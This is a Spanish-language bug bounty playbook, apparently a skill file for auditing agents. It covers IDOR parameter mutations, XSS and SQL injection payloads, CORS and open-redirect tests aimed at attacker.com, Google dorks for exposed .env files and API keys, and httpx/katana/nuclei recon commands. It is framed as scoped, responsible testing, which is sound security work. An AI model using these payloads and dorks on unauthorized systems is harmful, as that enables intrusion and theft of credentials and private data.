---
name: bug-bounty-tactical-playbook
description: Compendio de tácticas avanzadas, trucos de evasión y patrones de prueba para Bug Bounty y auditorías web. Incluye mutación de parámetros IDOR/BOLA, vectores XSS, SQLi numérico, bypass de OAuth/SSO, verificación de CORS y dorks OSINT.
---

# Bug Bounty Tactical Playbook & Evasion Matrix

Playbook de referencia táctica y heurística operativa para agentes de auditoría defensiva y especialistas en Bug Bounty. Proporciona patrones de prueba reproducibles, mutaciones de parámetros y vectores de verificación benigna.

---

## 🛡️ Principios Éticos y Reglas de Compromiso
- Todas las pruebas deben ejecutarse estrictamente dentro del alcance (scope) autorizado del programa.
- Utilizar exclusivamente comprobaciones benignas de bajo impacto (e.g. `user_id` de cuentas propias para IDOR, payloads no destructivos en inyecciones).
- Documentar evidencia paso a paso para el reporte de divulgación responsable.

---

## 🎯 1. IDOR & Broken Object Level Authorization (BOLA)

### Parámetros Críticos
Buscar parámetros de identificación directa en URLs, cabeceras y cuerpos JSON:
`user_id`, `account_id`, `profile_id`, `doc_id`, `invoice_id`, `order_id`, `uuid`, `org_id`

### Patrones de Mutación Táctica
```http
GET /api/user/profile?user_id=12345
```
1. **Desplazamiento Secuencial**: `user_id=12344`, `user_id=12346`
2. **Límites Numéricos e Invariantes**: `user_id=1` (cuenta admin), `user_id=0`, `user_id=-1`
3. **Array Wrapping / Type Juggling**: `user_id[]="12345"`, `{"user_id": [12345, 12344]}`
4. **Parameter Pollution (HPP)**: `?user_id=12345&user_id=12344`
5. **Cambio de Método HTTP**: Cambiar `GET` a `POST`, `PUT`, `DELETE` o `PATCH` manteniendo el ID objetivo.
6. **Bypass de Rutas**: `/api/user/profile/12344`, `/api/v1/user/12344`, `/api/v2/user/12344`

---

## 🎯 2. Cross-Site Scripting (XSS) y Evasión de Filtros

### Vectores de Prueba Benigna
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><svg/onload=alert(1)>
javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
```

### Contextos de Inyección
- **Atributos HTML**: `" onfocus="alert(1)" autofocus="`
- **Contextos JavaScript en línea**: `'-alert(1)-'`, `\';alert(1)//`
- **Markdown / Sanitizadores**: `[click](javascript:alert(1))`

---

## 🎯 3. SQL Injection en Parámetros Numéricos y Cadenas

### Verificación de Comportamiento y Respuestas Diferenciales
```http
GET /api/products?id=10
```
1. **Detección de Sintaxis Rota**: `?id=10'`, `?id=10"`, `?id=10\`
2. **Operadores Booleanos**:
   - `?id=10 OR 1=1` (debe devolver datos completos)
   - `?id=10 AND 1=2` (debe devolver respuesta vacía o error)
   - `?id=10-0` vs `?id=10-1` (aritmética en backend)
3. **Inyección Time-Based (Sleep)**:
   - MySQL: `10 AND SLEEP(5)`
   - PostgreSQL: `10 AND pg_sleep(5)`
   - MSSQL: `10 WAITFOR DELAY '0:0:5'`

---

## 🎯 4. CORS Misconfiguration & Robo de Datos Cross-Origin

### Verificación de Encabezados
Enviar petición con origen arbitrario o no confiable:
```http
GET /api/user/financial-data HTTP/1.1
Host: api.target.com
Origin: https://attacker.com
```

### Evaluación del Hallazgo
Si el servidor responde con:
```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
Existe una configuración insegura crítica si el endpoint expone PII, tokens o datos privados mediante cookies de sesión.

---

## 🎯 5. Open Redirect & Encadenamiento de Vectores

### Payloads de Bypass
```text
/redirect?url=attacker.com
/redirect?url=//attacker.com
/redirect?url=https://target.com@attacker.com
/redirect?url=https://target.com.attacker.com
/redirect?url=/\attacker.com
/redirect?url=%09//attacker.com
```

---

## 🎯 6. OSINT Dorks para Fuga de Documentos y Organigramas

```text
# Directorios de empleados y organigramas
site:target.com ("employee directory" OR "org chart" OR "team members") filetype:pdf OR filetype:xls OR filetype:docx

# Ficheros de configuración y variables de entorno expuestas
site:target.com ext:env OR ext:yml OR ext:yaml OR ext:conf "DB_PASSWORD" OR "API_KEY"

# Paneles administrativos y Swagger
site:target.com inurl:/api-docs OR inurl:/swagger-ui.html OR inurl:/v2/api-docs
```

---

## 🎯 7. Automatización de Reconocimiento CLI

```bash
# 1. Filtrar hosts activos con HTTPX
httpx -l subdomains.txt -o live_hosts.txt -status-code -title -tech-detect

# 2. Búsqueda de endpoints ocultos con Katana
katana -u live_hosts.txt -d 3 -jc -o endpoints.txt

# 3. Escaneo rápido de vulnerabilidades conocidas con Nuclei
nuclei -l live_hosts.txt -severity critical,high -t cves/ -o findings.txt
```
